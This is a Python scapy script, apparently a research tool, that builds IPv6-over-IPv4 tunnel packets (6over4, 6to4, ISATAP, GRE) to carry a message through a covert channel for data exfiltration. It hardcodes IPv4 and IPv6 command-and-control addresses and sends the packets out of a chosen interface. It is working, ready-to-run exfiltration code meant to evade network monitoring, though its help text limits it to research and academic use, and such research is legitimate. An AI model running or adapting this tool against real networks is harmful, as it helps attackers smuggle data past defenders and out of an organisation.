#!/usr/bin/python -tt
# (c) 2015 Bernhards 'Lockout' Blumbergs
# See LICENSE file for usage conditions
__version__ = '0.21/Ashley'

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from scapy.all import *
import argparse
from random import randint


def getip(iface):       # TODO: Detect default interface
    """
    Retrieve current IP address
    for a network interface
    """
    ipaddr = ""
    for x in conf.route.routes:
        if x[3] == iface:
            ipaddr = x[4]
            break
    return ipaddr


def a64(ipv4addr):
    """
    Converts IPv4 address W.X.Y.Z into
    IPv6 representation as WWXX:YYZZ
    """
    i = 0
    ipv6addr = ""
    octets = ipv4addr.split(".")
    for octet in octets:
        hexoctet = format(int(octet), "x")
        if len(hexoctet) % 2 != 0:
            hexoctet = "0" + hexoctet
        ipv6addr += hexoctet
        i += 1
        if i == 2:
            ipv6addr += ":"
    return ipv6addr


def a6over4(ipv4addr, prefix="2a02:", subnet=":"):
    """
    Create 6over4 address
    prefix 48b + subnet 16b + 0:0 32b + IPv4 32b
    """
    ipv6addr = prefix + subnet + a64(ipv4addr)
    return ipv6addr


def a6to4(ipv4addr, subnet=":0b0b", interface="::1"):
    """
    Create 6to4 address
    2002 16b + IPv4 32b + subnet 16b + interface 64b
    """
    ipv6addr = "2002:" + a64(ipv4addr) + subnet + interface
    return ipv6addr


def aISATAP(ipv4addr, unique=1, group=0, prefix="2a02:", subnet=":"):
    """
    Create ISATAP address
    prefix 48b + subnet 16b + ug00:5efe 32b + IPv4
    """
    id = "0" + format(
        int("000000" + str(unique) + str(group), 2), "x"
        ) + "00:5efe:"
    ipv6addr = prefix + subnet + id + a64(ipv4addr)
    return ipv6addr

parser = argparse.ArgumentParser(
    description='Using IPv6 transition mechanisms for covert'
    ' channel setup and information exfiltration',
    epilog='Unauthorized use of the tool is prohibited!'
    ' Only for research and academic purposes!')

parser.add_argument('-T', '--tcp',
                    action="store_true",
                    help='Use TCP for transport layer')
parser.add_argument('-U', '--udp',
                    action="store_true",
                    help='Use UDP for transport layer. Default: UDP')
parser.add_argument('-S', '--sctp',
                    action="store_true",
                    help='Use SCTP for transprt layer')
parser.add_argument('-N', '--nonh6',
                    action="store_true",
                    help="Use no next header for IPv6")
parser.add_argument('-tO', '--t6over4',
                    action="store_true",
                    help='Emulate 6over4 tunneling. Default: 6over4')
parser.add_argument('-tT', '--t6to4',
                    action="store_true",
                    help='Emulate 6to4 tunneling')
parser.add_argument('-tI', '--isatap',
                    action="store_true",
                    help='Emulate ISATAP tunneling')
parser.add_argument('-G', '--gre',
                    action="store_true",
                    help='Use GRE ecapsulation')
parser.add_argument('-v', '--verbose',
                    action="count",
                    help='Increase verbosity. 1: More information,'
                    ' 2: Debugging information')
parser.add_argument('-i', '--interface',
                    default='eth0',
                    type=str,
                    help='Ethernet interface. Default: eth0')
parser.add_argument('-s4', '--source4',
                    type=str,
                    help='Source IPv4 address. Default: host IPv4')
parser.add_argument('-d4', '--destination4',
                    type=str,
                    help='Destination IPv4 address')
parser.add_argument('-s6', '--source6',
                    type=str,
                    help='Source IPv6 address')
parser.add_argument('-d6', '--destination6',
                    type=str,
                    help='Destination IPv6 address')
parser.add_argument('-sp', '--srcport',
                    type=int,
                    default=443,
                    help='Source port. Default: 443')
parser.add_argument('-dp', '--dstport',
                    type=int,
                    default=443,
                    help='Destination port. Default: 443')
parser.add_argument('-m', '--message',
                    help='Message for exfiltration. Default: A*100')
parser.add_argument('-c', '--count',
                    type=int,
                    default=1,
                    help="Count of send iterations. Default: 1")
parser.add_argument('-r', '--relay',
                    action="store_true",
                    help="Use 6to4 relay.")
parser.add_argument('-V', '--version',
                    action="store_true",
                    help="Print software version and exit.")

args = parser.parse_args()
if args.verbose >= 2:
    print(args)

if args.version:
    print(__version__)
    quit()

# Static values for testing
cnc4 = "85.254.250.85"
cnc6 = "2a02:500:3333:1::85"

relay6to4 = "192.88.99.1"

if args.message:
    payload = args.message
else:
    payload = "A"*100

eth = args.interface
srcport = args.srcport
dstport = args.dstport

if args.source4:
    srcip4 = args.source4
else:
    srcip4 = getip(eth)

if args.destination4:
    dstip4 = args.destination4
else:
    if args.relay or args.t6to4:
        dstip4 = relay6to4
    else:
        print("[!] No destination IPv4 address specified!")
        exit(1)
        # dstip4 = cnc4

if args.source6:
    srcip6 = args.source6
else:
    if args.t6over4:
        srcip6 = a6over4(srcip4)
    elif args.t6to4:
        srcip6 = a6to4(srcip4)
    elif args.isatap:
        srcip6 = aISATAP(srcip4)
    else:
        srcip6 = a6over4(srcip4)

if args.destination6:
    dstip6 = args.destination6
else:
    print("[!] No destination IPv6 address specified!")
    exit(1)
    # dstip6 = cnc6

if args.verbose >= 2:
    print(srcip4, srcport, dstip4, dstport, srcip6, dstip6)

# Sending part
if args.tcp:
    if args.verbose >= 1:
        print("[*] Sending over TCP")
# Attempt a TCP handshake
#    ip4 = IP(proto=41, src=srcip4, dst=dstip4)
#    ip6 = IPv6(src=srcip6, dst=dstip6)
#    load = Raw(payload)
#    tcpseq = randint(100, 5400)
#    tcpsyn = TCP(sport=srcport, dport=dstport, flags="S", seq=tcpseq)
#    print("[D] Sending syn seq={0}. Awaiting syn-ack".format(tcpsyn.seq))
#    tcpsynack = sr1(ip4/ip6/tcpsyn)
#    tcpackseq = tcpsynack.seq + 1
#    tcpack = TCP(sport=srcport, dport=dstport, flags="A", seq=tcpseq+1, ack=tcpackseq)
#    print("[D] Received syn-ack={0}. Sending ack".format(tcpackseq))
#    send(ip4/ip6/tcpack)
#    tcppsh = TCP(sport=srcport, dport=dstport, flags="PA", seq=tcpseq+1, ack=tcpackseq)
#    print("[D] Sending the payload")
#    send(ip4/ip6/tcppsh/load)
    ip4 = IP(proto=41, src=srcip4, dst=dstip4)
    ip6 = IPv6(src=srcip6, dst=dstip6)
    tcp = TCP(sport=srcport, dport=dstport)
    raw = Raw(payload)
    packet = ip4/ip6/tcp/raw

elif args.udp:
    if args.verbose >= 1:
        print("[*] Sending over UDP")
    ip4 = IP(proto=41, src=srcip4, dst=dstip4)
    ip6 = IPv6(src=srcip6, dst=dstip6)
    udp = UDP(sport=srcport, dport=dstport)
    raw = Raw(payload)
    packet = ip4/ip6/udp/raw

elif args.sctp:
    if args.verbose >= 1:
        print("[*] Sending over SCTP")
    ip4 = IP(proto=41, src=srcip4, dst=dstip4)
    ip6 = IPv6(src=srcip6, dst=dstip6, nh=132)
    sctp = SCTP(sport=srcport, dport=dstport)
    raw = Raw(payload)
    packet = ip4/ip6/sctp/raw

elif args.nonh6:
    if args.verbose >= 1:
        print("[*] Sending with No Next Header IPv6")
    ip4 = IP(proto=41, src=srcip4, dst=dstip4)
    ip6 = IPv6(src=srcip6, dst=dstip6, nh=59)
    udp = UDP(sport=srcport, dport=dstport)
    raw = Raw(payload)
    packet = ip4/ip6/udp/raw

if args.gre:
    if args.verbose >= 1:
        print("[*] Using GRE")
    ip = IP(proto=47, src=srcip4, dst=dstip4)
    gre = GRE(proto=41)
    load = packet[IP].payload
    packet = ip/gre/load

if args.verbose >= 2:
    ls(packet)
# if not args.tcp:
send(packet, iface=eth, count=args.count)
